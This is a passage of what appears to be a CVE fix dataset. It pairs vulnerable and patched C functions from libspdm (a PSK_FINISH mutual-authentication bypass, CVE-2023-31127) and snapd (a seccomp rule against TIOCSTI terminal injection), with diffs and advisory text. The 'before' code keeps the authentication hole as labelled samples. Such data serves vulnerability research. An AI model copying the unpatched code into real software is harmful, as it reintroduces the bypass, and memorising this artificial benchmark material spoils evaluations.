                                                response_size, response);
     }
     session_state = libspdm_secured_message_get_session_state(","{'deleted_lines': [], 'added_lines': ['                                               response_size, response);', '    }', '    if (session_info->use_psk) {', '        return libspdm_generate_error_response(spdm_context,', '                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,']}",True,"libspdm is a sample implementation that follows the DMTF SPDM specifications. A vulnerability has been identified in SPDM session establishment in libspdm prior to version 2.3.1. If a device supports both DHE session and PSK session with mutual
authentication, the attacker may be able to establish the session with `KEY_EXCHANGE` and `PSK_FINISH` to bypass the mutual authentication. This is most likely to happen when the Requester begins a session using one method (DHE, for example) and then uses the other method's finish (PSK_FINISH in this example) to establish the session. The session hashes would be expected to fail in this case, but the condition was not detected.

This issue only impacts the SPDM responder, which supports `KEY_EX_CAP=1 and `PSK_CAP=10b` at same time with mutual authentication requirement. The SPDM requester is not impacted. The SPDM responder is not impacted if `KEY_EX_CAP=0` or `PSK_CAP=0` or `PSK_CAP=01b`. The SPDM responder is not impacted if mutual authentication is not required.

libspdm 1.0, 2.0, 2.1, 2.2, 2.3 are all impacted. Older branches are not maintained, but users of the 2.3 branch may receive a patch in version 2.3.2. The SPDM specification (DSP0274) does not contain this vulnerability.",9.0,CRITICAL,3,valid,2023-03-21T06:44:40Z,4
CVE-2023-31127,['CWE-287'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H,1,DMTF/libspdm,"Add handshake mode switch check in FINISH and PSK_FINISH.

Reference: DMTF-2023-0001

Fix: https://github.com/DMTF/libspdm/issues/2005

Signed-off-by: Jiewen Yao <jiewen.yao@intel.com>",8426a309c1de246ac13012246e44b6249a43d081,https://github.com/DMTF/libspdm/commit/8426a309c1de246ac13012246e44b6249a43d081,library/spdm_responder_lib/libspdm_rsp_psk_finish.c,libspdm_get_response_psk_finish,"libspdm_return_t libspdm_get_response_psk_finish(void *context,
size_t request_size,
const void *request,
size_t *response_size,
void *response)
{
uint32_t session_id;
bool result;
uint32_t hmac_size;
spdm_psk_finish_response_t *spdm_response;
libspdm_context_t *spdm_context;
libspdm_session_info_t *session_info;
uint8_t th2_hash_data[LIBSPDM_MAX_HASH_SIZE];
const spdm_psk_finish_request_t *spdm_request;
libspdm_return_t status;
libspdm_session_state_t session_state;
spdm_context = context;
spdm_request = request;
if (spdm_request->header.spdm_version != libspdm_get_connection_version(spdm_context)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_VERSION_MISMATCH, 0,
response_size, response);
}
if (spdm_context->response_state != LIBSPDM_RESPONSE_STATE_NORMAL) {
return libspdm_responder_handle_response_state(
spdm_context,
spdm_request->header.request_response_code,
response_size, response);
}
if (!libspdm_is_capabilities_flag_supported(
spdm_context, false,
SPDM_GET_CAPABILITIES_REQUEST_FLAGS_PSK_CAP,
SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_PSK_CAP_RESPONDER_WITH_CONTEXT)) {
return libspdm_generate_error_response(
spdm_context, SPDM_ERROR_CODE_UNSUPPORTED_REQUEST,
SPDM_PSK_EXCHANGE, response_size, response);
}
if (spdm_context->connection_info.connection_state < LIBSPDM_CONNECTION_STATE_NEGOTIATED) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNEXPECTED_REQUEST,
0, response_size, response);
}
if (!spdm_context->last_spdm_request_session_id_valid) {
return libspdm_generate_error_response(context,
SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
response_size, response);
}
session_id = spdm_context->last_spdm_request_session_id;
session_info =
libspdm_get_session_info_via_session_id(spdm_context, session_id);
if (session_info == NULL) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
response_size, response);
}
session_state = libspdm_secured_message_get_session_state(
session_info->secured_message_context);
if (session_state != LIBSPDM_SESSION_STATE_HANDSHAKING) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,
response_size, response);
}
hmac_size = libspdm_get_hash_size(
spdm_context->connection_info.algorithm.base_hash_algo);
if (request_size != sizeof(spdm_psk_finish_request_t) + hmac_size) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_INVALID_REQUEST, 0,
response_size, response);
}
libspdm_reset_message_buffer_via_request_code(spdm_context, session_info,
spdm_request->header.request_response_code);
status = libspdm_append_message_f(spdm_context, session_info, false, request,
request_size - hmac_size);
if (LIBSPDM_STATUS_IS_ERROR(status)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
LIBSPDM_ASSERT(*response_size >= sizeof(spdm_psk_finish_response_t));
*response_size = sizeof(spdm_psk_finish_response_t);
libspdm_zero_mem(response, *response_size);
spdm_response = response;
spdm_response->header.spdm_version = spdm_request->header.spdm_version;
spdm_response->header.request_response_code = SPDM_PSK_FINISH_RSP;
spdm_response->header.param1 = 0;
spdm_response->header.param2 = 0;
result = libspdm_verify_psk_finish_req_hmac(
spdm_context, session_info,
(const uint8_t *)request + sizeof(spdm_psk_finish_request_t),
hmac_size);
if (!result) {
if((spdm_context->handle_error_return_policy &
LIBSPDM_DATA_HANDLE_ERROR_RETURN_POLICY_DROP_ON_DECRYPT_ERROR) == 0) {
return libspdm_generate_error_response(
spdm_context, SPDM_ERROR_CODE_DECRYPT_ERROR, 0,
response_size, response);
} else {
*response_size = 0;
return LIBSPDM_STATUS_UNSUPPORTED_CAP;
}
}
status = libspdm_append_message_f(
spdm_context, session_info, false,
(const uint8_t *)request + request_size - hmac_size,
hmac_size);
if (LIBSPDM_STATUS_IS_ERROR(status)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
status = libspdm_append_message_f(spdm_context, session_info, false, spdm_response,
*response_size);
if (LIBSPDM_STATUS_IS_ERROR(status)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
LIBSPDM_DEBUG((LIBSPDM_DEBUG_INFO, ""libspdm_generate_session_data_key[%x]\n"", session_id));
result = libspdm_calculate_th2_hash(spdm_context, session_info, false,
th2_hash_data);
if (!result) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
result = libspdm_generate_session_data_key(
session_info->secured_message_context, th2_hash_data);
if (!result) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
#if LIBSPDM_ENABLE_CAPABILITY_HBEAT_CAP
if (libspdm_is_capabilities_flag_supported(
spdm_context, false,
SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HBEAT_CAP,
SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HBEAT_CAP)) {
result = libspdm_start_watchdog(
session_id, spdm_context->local_context.heartbeat_period * 2);
if (!result) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
}
#endif 
return LIBSPDM_STATUS_SUCCESS;
}","libspdm_return_t libspdm_get_response_psk_finish(void *VAR_0,
size_t VAR_1,
const void *VAR_2,
size_t *VAR_3,
void *VAR_4)
{
uint32_t VAR_5;
bool VAR_6;
uint32_t VAR_7;
spdm_psk_finish_response_t *VAR_8;
libspdm_context_t *VAR_9;
libspdm_session_info_t *VAR_10;
uint8_t VAR_11[VAR_12];
const spdm_psk_finish_request_t *VAR_13;
libspdm_return_t VAR_14;
libspdm_session_state_t VAR_15;
VAR_9 = VAR_0;
VAR_13 = VAR_2;
if (VAR_13->header.spdm_version != libspdm_get_connection_version(VAR_9)) {
return libspdm_generate_error_response(VAR_9,
VAR_16, 0,
VAR_3, VAR_4);
}
if (VAR_9->response_state != VAR_17) {
return libspdm_responder_handle_response_state(
VAR_9,
VAR_13->header.request_response_code,
VAR_3, VAR_4);
}
if (!libspdm_is_capabilities_flag_supported(
VAR_9, false,
VAR_18,
VAR_19)) {
return libspdm_generate_error_response(
VAR_9, VAR_20,
VAR_21, VAR_3, VAR_4);
}
if (VAR_9->connection_info.connection_state < VAR_22) {
return libspdm_generate_error_response(VAR_9,
VAR_23,
0, VAR_3, VAR_4);
}
if (!VAR_9->last_spdm_request_session_id_valid) {
return libspdm_generate_error_response(VAR_0,
VAR_24, 0,
VAR_3, VAR_4);
}
VAR_5 = VAR_9->last_spdm_request_session_id;
VAR_10 =
libspdm_get_session_info_via_session_id(VAR_9, VAR_5);
if (VAR_10 == NULL) {
return libspdm_generate_error_response(VAR_9,
VAR_24, 0,
VAR_3, VAR_4);
}
VAR_15 = libspdm_secured_message_get_session_state(
VAR_10->secured_message_context);
if (VAR_15 != VAR_25) {
return libspdm_generate_error_response(VAR_9,
VAR_23, 0,
VAR_3, VAR_4);
}
VAR_7 = libspdm_get_hash_size(
VAR_9->connection_info.algorithm.base_hash_algo);
if (VAR_1 != sizeof(spdm_psk_finish_request_t) + VAR_7) {
return libspdm_generate_error_response(VAR_9,
VAR_26, 0,
VAR_3, VAR_4);
}
libspdm_reset_message_buffer_via_request_code(VAR_9, VAR_10,
VAR_13->header.request_response_code);
VAR_14 = libspdm_append_message_f(VAR_9, VAR_10, false, VAR_2,
VAR_1 - VAR_7);
if (LIBSPDM_STATUS_IS_ERROR(VAR_14)) {
return libspdm_generate_error_response(VAR_9,
VAR_27, 0,
VAR_3, VAR_4);
}
LIBSPDM_ASSERT(*VAR_3 >= sizeof(spdm_psk_finish_response_t));
*VAR_3 = sizeof(spdm_psk_finish_response_t);
libspdm_zero_mem(VAR_4, *VAR_3);
VAR_8 = VAR_4;
VAR_8->header.spdm_version = VAR_13->header.spdm_version;
VAR_8->header.request_response_code = VAR_28;
VAR_8->header.param1 = 0;
VAR_8->header.param2 = 0;
VAR_6 = libspdm_verify_psk_finish_req_hmac(
VAR_9, VAR_10,
(const uint8_t *)VAR_2 + sizeof(spdm_psk_finish_request_t),
VAR_7);
if (!VAR_6) {
if((VAR_9->handle_error_return_policy &
VAR_29) == 0) {
return libspdm_generate_error_response(
VAR_9, VAR_30, 0,
VAR_3, VAR_4);
} else {
*VAR_3 = 0;
return VAR_31;
}
}
VAR_14 = libspdm_append_message_f(
VAR_9, VAR_10, false,
(const uint8_t *)VAR_2 + VAR_1 - VAR_7,
VAR_7);
if (LIBSPDM_STATUS_IS_ERROR(VAR_14)) {
return libspdm_generate_error_response(VAR_9,
VAR_27, 0,
VAR_3, VAR_4);
}
VAR_14 = libspdm_append_message_f(VAR_9, VAR_10, false, VAR_8,
*VAR_3);
if (LIBSPDM_STATUS_IS_ERROR(VAR_14)) {
return libspdm_generate_error_response(VAR_9,
VAR_27, 0,
VAR_3, VAR_4);
}
LIBSPDM_DEBUG((VAR_32, ""libspdm_generate_session_data_key[%x]\n"", VAR_5));
VAR_6 = libspdm_calculate_th2_hash(VAR_9, VAR_10, false,
VAR_11);
if (!VAR_6) {
return libspdm_generate_error_response(VAR_9,
VAR_27, 0,
VAR_3, VAR_4);
}
VAR_6 = libspdm_generate_session_data_key(
VAR_10->secured_message_context, VAR_11);
if (!VAR_6) {
return libspdm_generate_error_response(VAR_9,
VAR_27, 0,
VAR_3, VAR_4);
}
#if VAR_33
if (libspdm_is_capabilities_flag_supported(
VAR_9, false,
VAR_34,
VAR_35)) {
VAR_6 = libspdm_start_watchdog(
VAR_5, VAR_9->local_context.heartbeat_period * 2);
if (!VAR_6) {
return libspdm_generate_error_response(VAR_9,
VAR_27, 0,
VAR_3, VAR_4);
}
}
#endif 
return VAR_36;
}",DMTF/libspdm/8426a309c1de246ac13012246e44b6249a43d081/libspdm_rsp_psk_finish.c/vul/before/0.json,"libspdm_return_t libspdm_get_response_psk_finish(void *context,
                                                 size_t request_size,
                                                 const void *request,
                                                 size_t *response_size,
                                                 void *response)
{
    uint32_t session_id;
    bool result;
    uint32_t hmac_size;
    spdm_psk_finish_response_t *spdm_response;
    libspdm_context_t *spdm_context;
    libspdm_session_info_t *session_info;
    uint8_t th2_hash_data[LIBSPDM_MAX_HASH_SIZE];
    const spdm_psk_finish_request_t *spdm_request;
    libspdm_return_t status;
    libspdm_session_state_t session_state;

    spdm_context = context;
    spdm_request = request;

    if (spdm_request->header.spdm_version != libspdm_get_connection_version(spdm_context)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_VERSION_MISMATCH, 0,
                                               response_size, response);
    }
    if (spdm_context->response_state != LIBSPDM_RESPONSE_STATE_NORMAL) {
        return libspdm_responder_handle_response_state(
            spdm_context,
            spdm_request->header.request_response_code,
            response_size, response);
    }
    if (!libspdm_is_capabilities_flag_supported(
            spdm_context, false,
            SPDM_GET_CAPABILITIES_REQUEST_FLAGS_PSK_CAP,
            SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_PSK_CAP_RESPONDER_WITH_CONTEXT)) {
        return libspdm_generate_error_response(
            spdm_context, SPDM_ERROR_CODE_UNSUPPORTED_REQUEST,
            SPDM_PSK_EXCHANGE, response_size, response);
    }
    if (spdm_context->connection_info.connection_state < LIBSPDM_CONNECTION_STATE_NEGOTIATED) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST,
                                               0, response_size, response);
    }

    if (!spdm_context->last_spdm_request_session_id_valid) {
        return libspdm_generate_error_response(context,
                                               SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
                                               response_size, response);
    }
    session_id = spdm_context->last_spdm_request_session_id;
    session_info =
        libspdm_get_session_info_via_session_id(spdm_context, session_id);
    if (session_info == NULL) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
                                               response_size, response);
    }
    if (!session_info->use_psk) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,
                                               response_size, response);
    }
    session_state = libspdm_secured_message_get_session_state(
        session_info->secured_message_context);
    if (session_state != LIBSPDM_SESSION_STATE_HANDSHAKING) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,
                                               response_size, response);
    }

    /* remove HMAC*/
    hmac_size = libspdm_get_hash_size(
        spdm_context->connection_info.algorithm.base_hash_algo);

    if (request_size != sizeof(spdm_psk_finish_request_t) + hmac_size) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_INVALID_REQUEST, 0,
                                               response_size, response);
    }

    libspdm_reset_message_buffer_via_request_code(spdm_context, session_info,
                                                  spdm_request->header.request_response_code);

    status = libspdm_append_message_f(spdm_context, session_info, false, request,
                                      request_size - hmac_size);
    if (LIBSPDM_STATUS_IS_ERROR(status)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }

    LIBSPDM_ASSERT(*response_size >= sizeof(spdm_psk_finish_response_t));
    *response_size = sizeof(spdm_psk_finish_response_t);
    libspdm_zero_mem(response, *response_size);
    spdm_response = response;

    spdm_response->header.spdm_version = spdm_request->header.spdm_version;
    spdm_response->header.request_response_code = SPDM_PSK_FINISH_RSP;
    spdm_response->header.param1 = 0;
    spdm_response->header.param2 = 0;

    result = libspdm_verify_psk_finish_req_hmac(
        spdm_context, session_info,
        (const uint8_t *)request + sizeof(spdm_psk_finish_request_t),
        hmac_size);
    if (!result) {
        if((spdm_context->handle_error_return_policy &
            LIBSPDM_DATA_HANDLE_ERROR_RETURN_POLICY_DROP_ON_DECRYPT_ERROR) == 0) {
            return libspdm_generate_error_response(
                spdm_context, SPDM_ERROR_CODE_DECRYPT_ERROR, 0,
                response_size, response);
        } else {
            /**
             * just ignore this message
             * return UNSUPPORTED and clear response_size to continue the dispatch without send response
             **/
            *response_size = 0;
            return LIBSPDM_STATUS_UNSUPPORTED_CAP;
        }
    }
    status = libspdm_append_message_f(
        spdm_context, session_info, false,
        (const uint8_t *)request + request_size - hmac_size,
        hmac_size);
    if (LIBSPDM_STATUS_IS_ERROR(status)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }

    status = libspdm_append_message_f(spdm_context, session_info, false, spdm_response,
                                      *response_size);
    if (LIBSPDM_STATUS_IS_ERROR(status)) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }

    LIBSPDM_DEBUG((LIBSPDM_DEBUG_INFO, ""libspdm_generate_session_data_key[%x]\n"", session_id));
    result = libspdm_calculate_th2_hash(spdm_context, session_info, false,
                                        th2_hash_data);
    if (!result) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }
    result = libspdm_generate_session_data_key(
        session_info->secured_message_context, th2_hash_data);
    if (!result) {
        return libspdm_generate_error_response(spdm_context,
                                               SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                               response_size, response);
    }

    #if LIBSPDM_ENABLE_CAPABILITY_HBEAT_CAP
    if (libspdm_is_capabilities_flag_supported(
            spdm_context, false,
            SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HBEAT_CAP,
            SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HBEAT_CAP)) {
        result = libspdm_start_watchdog(
            session_id, spdm_context->local_context.heartbeat_period * 2);
        if (!result) {
            return libspdm_generate_error_response(spdm_context,
                                                   SPDM_ERROR_CODE_UNSPECIFIED, 0,
                                                   response_size, response);
        }
    }
    #endif /* LIBSPDM_ENABLE_CAPABILITY_HBEAT_CAP */

    return LIBSPDM_STATUS_SUCCESS;
}","libspdm_return_t libspdm_get_response_psk_finish(void *VAR_0,
                                                 size_t VAR_1,
                                                 const void *VAR_2,
                                                 size_t *VAR_3,
                                                 void *VAR_4)
{
    uint32_t VAR_5;
    bool VAR_6;
    uint32_t VAR_7;
    spdm_psk_finish_response_t *VAR_8;
    libspdm_context_t *VAR_9;
    libspdm_session_info_t *VAR_10;
    uint8_t VAR_11[VAR_12];
    const spdm_psk_finish_request_t *VAR_13;
    libspdm_return_t VAR_14;
    libspdm_session_state_t VAR_15;

    VAR_9 = VAR_0;
    VAR_13 = VAR_2;

    if (VAR_13->header.spdm_version != libspdm_get_connection_version(VAR_9)) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_16, 0,
                                               VAR_3, VAR_4);
    }
    if (VAR_9->response_state != VAR_17) {
        return libspdm_responder_handle_response_state(
            VAR_9,
            VAR_13->header.request_response_code,
            VAR_3, VAR_4);
    }
    if (!libspdm_is_capabilities_flag_supported(
            VAR_9, false,
            VAR_18,
            VAR_19)) {
        return libspdm_generate_error_response(
            VAR_9, VAR_20,
            VAR_21, VAR_3, VAR_4);
    }
    if (VAR_9->connection_info.connection_state < VAR_22) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_23,
                                               0, VAR_3, VAR_4);
    }

    if (!VAR_9->last_spdm_request_session_id_valid) {
        return libspdm_generate_error_response(VAR_0,
                                               VAR_24, 0,
                                               VAR_3, VAR_4);
    }
    VAR_5 = VAR_9->last_spdm_request_session_id;
    VAR_10 =
        libspdm_get_session_info_via_session_id(VAR_9, VAR_5);
    if (VAR_10 == NULL) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_24, 0,
                                               VAR_3, VAR_4);
    }
    if (!VAR_10->use_psk) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_23, 0,
                                               VAR_3, VAR_4);
    }
    VAR_15 = libspdm_secured_message_get_session_state(
        VAR_10->secured_message_context);
    if (VAR_15 != VAR_25) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_23, 0,
                                               VAR_3, VAR_4);
    }

    /* COMMENT_0 */
    VAR_7 = libspdm_get_hash_size(
        VAR_9->connection_info.algorithm.base_hash_algo);

    if (VAR_1 != sizeof(spdm_psk_finish_request_t) + VAR_7) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_26, 0,
                                               VAR_3, VAR_4);
    }

    libspdm_reset_message_buffer_via_request_code(VAR_9, VAR_10,
                                                  VAR_13->header.request_response_code);

    VAR_14 = libspdm_append_message_f(VAR_9, VAR_10, false, VAR_2,
                                      VAR_1 - VAR_7);
    if (LIBSPDM_STATUS_IS_ERROR(VAR_14)) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_27, 0,
                                               VAR_3, VAR_4);
    }

    LIBSPDM_ASSERT(*VAR_3 >= sizeof(spdm_psk_finish_response_t));
    *VAR_3 = sizeof(spdm_psk_finish_response_t);
    libspdm_zero_mem(VAR_4, *VAR_3);
    VAR_8 = VAR_4;

    VAR_8->header.spdm_version = VAR_13->header.spdm_version;
    VAR_8->header.request_response_code = VAR_28;
    VAR_8->header.param1 = 0;
    VAR_8->header.param2 = 0;

    VAR_6 = libspdm_verify_psk_finish_req_hmac(
        VAR_9, VAR_10,
        (const uint8_t *)VAR_2 + sizeof(spdm_psk_finish_request_t),
        VAR_7);
    if (!VAR_6) {
        if((VAR_9->handle_error_return_policy &
            VAR_29) == 0) {
            return libspdm_generate_error_response(
                VAR_9, VAR_30, 0,
                VAR_3, VAR_4);
        } else {
            /* COMMENT_1 */
                                       
                                                                                                        
                
            *VAR_3 = 0;
            return VAR_31;
        }
    }
    VAR_14 = libspdm_append_message_f(
        VAR_9, VAR_10, false,
        (const uint8_t *)VAR_2 + VAR_1 - VAR_7,
        VAR_7);
    if (LIBSPDM_STATUS_IS_ERROR(VAR_14)) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_27, 0,
                                               VAR_3, VAR_4);
    }

    VAR_14 = libspdm_append_message_f(VAR_9, VAR_10, false, VAR_8,
                                      *VAR_3);
    if (LIBSPDM_STATUS_IS_ERROR(VAR_14)) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_27, 0,
                                               VAR_3, VAR_4);
    }

    LIBSPDM_DEBUG((VAR_32, ""libspdm_generate_session_data_key[%x]\n"", VAR_5));
    VAR_6 = libspdm_calculate_th2_hash(VAR_9, VAR_10, false,
                                        VAR_11);
    if (!VAR_6) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_27, 0,
                                               VAR_3, VAR_4);
    }
    VAR_6 = libspdm_generate_session_data_key(
        VAR_10->secured_message_context, VAR_11);
    if (!VAR_6) {
        return libspdm_generate_error_response(VAR_9,
                                               VAR_27, 0,
                                               VAR_3, VAR_4);
    }

    #if VAR_33
    if (libspdm_is_capabilities_flag_supported(
            VAR_9, false,
            VAR_34,
            VAR_35)) {
        VAR_6 = libspdm_start_watchdog(
            VAR_5, VAR_9->local_context.heartbeat_period * 2);
        if (!VAR_6) {
            return libspdm_generate_error_response(VAR_9,
                                                   VAR_27, 0,
                                                   VAR_3, VAR_4);
        }
    }
    #endif /* COMMENT_5 */

    return VAR_36;
}",DMTF/libspdm/8426a309c1de246ac13012246e44b6249a43d081/libspdm_rsp_psk_finish.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -54,6 +54,11 @@
     if (session_info == NULL) {
         return libspdm_generate_error_response(spdm_context,
                                                SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
+                                               response_size, response);
+    }
+    if (!session_info->use_psk) {
+        return libspdm_generate_error_response(spdm_context,
+                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,
                                                response_size, response);
     }
     session_state = libspdm_secured_message_get_session_state(","{'deleted_lines': [], 'added_lines': ['                                               response_size, response);', '    }', '    if (!session_info->use_psk) {', '        return libspdm_generate_error_response(spdm_context,', '                                               SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,']}",True,"libspdm is a sample implementation that follows the DMTF SPDM specifications. A vulnerability has been identified in SPDM session establishment in libspdm prior to version 2.3.1. If a device supports both DHE session and PSK session with mutual
authentication, the attacker may be able to establish the session with `KEY_EXCHANGE` and `PSK_FINISH` to bypass the mutual authentication. This is most likely to happen when the Requester begins a session using one method (DHE, for example) and then uses the other method's finish (PSK_FINISH in this example) to establish the session. The session hashes would be expected to fail in this case, but the condition was not detected.

This issue only impacts the SPDM responder, which supports `KEY_EX_CAP=1 and `PSK_CAP=10b` at same time with mutual authentication requirement. The SPDM requester is not impacted. The SPDM responder is not impacted if `KEY_EX_CAP=0` or `PSK_CAP=0` or `PSK_CAP=01b`. The SPDM responder is not impacted if mutual authentication is not required.

libspdm 1.0, 2.0, 2.1, 2.2, 2.3 are all impacted. Older branches are not maintained, but users of the 2.3 branch may receive a patch in version 2.3.2. The SPDM specification (DSP0274) does not contain this vulnerability.",9.0,CRITICAL,3,valid,2023-03-21T06:44:40Z,4
CVE-2023-1523,['CWE-74'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H,1,snapcore/snapd,"snap-seccomp-blacklist: also disallow the use of ioctl + TIOCLINUX

Fixes CVE-2023-1523

Signed-off-by: Alex Murray <alex.murray@canonical.com>",997dbfd5327d6e429f63ae7adc2bf2b31f070931,https://github.com/snapcore/snapd/commit/997dbfd5327d6e429f63ae7adc2bf2b31f070931,cmd/snap-seccomp-blacklist/snap-seccomp-blacklist.c,populate_filter,"static int populate_filter(scmp_filter_ctx ctx, const uint32_t *arch_tags, size_t num_arch_tags) {
int sc_err;
uint32_t native_arch = seccomp_arch_native();
bool remove_native_arch = true;
for (size_t i = 0; i < num_arch_tags; ++i) {
if (arch_tags[i] == native_arch) {
remove_native_arch = false;
break;
}
}
if (remove_native_arch) {
sc_err = seccomp_arch_remove(ctx, SCMP_ARCH_NATIVE);
if (sc_err < 0) {
showerr(""cannot remove native architecture"");
return sc_err;
}
}
for (size_t i = 0; i < num_arch_tags; ++i) {
uint32_t arch_tag = arch_tags[i];
sc_err = seccomp_arch_add(ctx, arch_tag);
if (sc_err < 0 && sc_err != -EEXIST) {
showerr(""cannot add architecture %x"", arch_tag);
return sc_err;
}
}
sc_err = seccomp_attr_set(ctx, SCMP_FLTATR_ACT_BADARCH, SCMP_ACT_ALLOW);
if (sc_err < 0) {
showerr(""cannot set action for unknown architectures"");
return sc_err;
}
int sys_ioctl_nr;
sys_ioctl_nr = seccomp_syscall_resolve_name(""ioctl"");
if (sys_ioctl_nr == __NR_SCMP_ERROR) {
showerr(""cannot resolve ioctl system call number"");
return -ESRCH;
}
const struct scmp_arg_cmp no_tty_inject = {
.arg = 1,
.op = SCMP_CMP_MASKED_EQ,
.datum_a = 0xffffffffUL,
.datum_b = TIOCSTI,
};
sc_err = seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), sys_ioctl_nr, 1, no_tty_inject);
if (sc_err < 0) {
showerr(""cannot add rule preventing the use high bits in ioctl"");
return sc_err;
}
return 0;
}","static int populate_filter(scmp_filter_ctx VAR_0, const uint32_t *VAR_1, size_t VAR_2) {
int VAR_3;
uint32_t VAR_4 = seccomp_arch_native();
bool VAR_5 = true;
for (size_t VAR_6 = 0; VAR_6 < VAR_2; ++VAR_6) {
if (VAR_1[VAR_6] == VAR_4) {
VAR_5 = false;
break;
}
}
if (VAR_5) {
VAR_3 = seccomp_arch_remove(VAR_0, VAR_7);
if (VAR_3 < 0) {
showerr(""cannot remove native architecture"");
return VAR_3;
}
}
for (size_t VAR_6 = 0; VAR_6 < VAR_2; ++VAR_6) {
uint32_t VAR_8 = VAR_1[VAR_6];
VAR_3 = seccomp_arch_add(VAR_0, VAR_8);
if (VAR_3 < 0 && VAR_3 != -VAR_9) {
showerr(""cannot add architecture %x"", VAR_8);
return VAR_3;
}
}
VAR_3 = seccomp_attr_set(VAR_0, VAR_10, VAR_11);
if (VAR_3 < 0) {
showerr(""cannot set action for unknown architectures"");
return VAR_3;
}
int VAR_12;
VAR_12 = seccomp_syscall_resolve_name(""ioctl"");
if (VAR_12 == VAR_13) {
showerr(""cannot resolve ioctl system call number"");
return -VAR_14;
}
const struct scmp_arg_cmp VAR_15 = {
.arg = 1,
.op = VAR_16,
.datum_a = 0xffffffffUL,
.datum_b = VAR_17,
};
VAR_3 = seccomp_rule_add(VAR_0, SCMP_ACT_ERRNO(VAR_18), VAR_12, 1, VAR_15);
if (VAR_3 < 0) {
showerr(""cannot add rule preventing the use high bits in ioctl"");
return VAR_3;
}
return 0;
}",snapcore/snapd/997dbfd5327d6e429f63ae7adc2bf2b31f070931/snap-seccomp-blacklist.c/vul/before/0.json,"static int populate_filter(scmp_filter_ctx ctx, const uint32_t *arch_tags, size_t num_arch_tags) {
    int sc_err;

    /* If the native architecture is not one of the supported 64bit
     * architectures listed in main in le_arch_tags and be_arch_tags, then
     * remove it.
     *
     * Libseccomp automatically adds the native architecture to each new filter.
     * If the native architecture is a 32bit-one then we will hit a bug in libseccomp
     * and the generated BPF program is incorrect as described below. */
    uint32_t native_arch = seccomp_arch_native();
    bool remove_native_arch = true;
    for (size_t i = 0; i < num_arch_tags; ++i) {
        if (arch_tags[i] == native_arch) {
            remove_native_arch = false;
            break;
        }
    }
    if (remove_native_arch) {
        sc_err = seccomp_arch_remove(ctx, SCMP_ARCH_NATIVE);
        if (sc_err < 0) {
            showerr(""cannot remove native architecture"");
            return sc_err;
        }
    }

    /* Add 64-bit architectures supported by snapd into the seccomp filter.
     *
     * The documentation of seccomp_arch_add() is confusing. It says that after
     * this call any new rules will be added to this architecture. This is
     * correct. It doesn't, however, explain that the rules will be multiplied
     * and re-written as explained below. */
    for (size_t i = 0; i < num_arch_tags; ++i) {
        uint32_t arch_tag = arch_tags[i];
        sc_err = seccomp_arch_add(ctx, arch_tag);
        if (sc_err < 0 && sc_err != -EEXIST) {
            showerr(""cannot add architecture %x"", arch_tag);
            return sc_err;
        }
    }

    /* When the rule set doesn't match one of the architectures above then the
     * resulting action should be a ""allow"" rather than ""kill"". We don't add
